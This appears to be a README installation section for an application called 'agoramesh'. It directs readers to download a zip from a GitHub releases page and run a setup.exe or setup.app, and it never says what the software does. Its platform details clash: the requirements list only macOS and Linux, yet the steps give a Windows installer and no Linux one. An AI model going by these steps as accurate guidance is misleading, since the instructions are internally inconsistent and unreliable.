Before you install, ensure your system meets the following requirements:

- **Operating System:**

  - macOS 10.14 or later
  - Linux (most distributions supported)

- **RAM:** 4 GB or more

## 🔧 Installation Steps

1. **Visit the Download Page**  
   Click the link below to download the latest version.  
   [Download agoramesh](https://github.com/jhonatann286/agoramesh/releases)  

2. **Locate the Downloaded File**  
   Once the download finishes, open your Downloads folder. You will see a file named `agoramesh-installer.zip`.

3. **Unzip the File**  
   Right-click on `agoramesh-installer.zip` and select “Extract All” to unpack the files.

4. **Run the Installer**  
   Double-click on the `setup.exe` (Windows) or `setup.app` (macOS). Follow the on-screen instructions.

5. **Complete the Setup**  
   Once the installation is complete, you will see an agoramesh icon on your desktop. 

6. **Launch the Application**  
   Double-click the agoramesh icon to open the application.
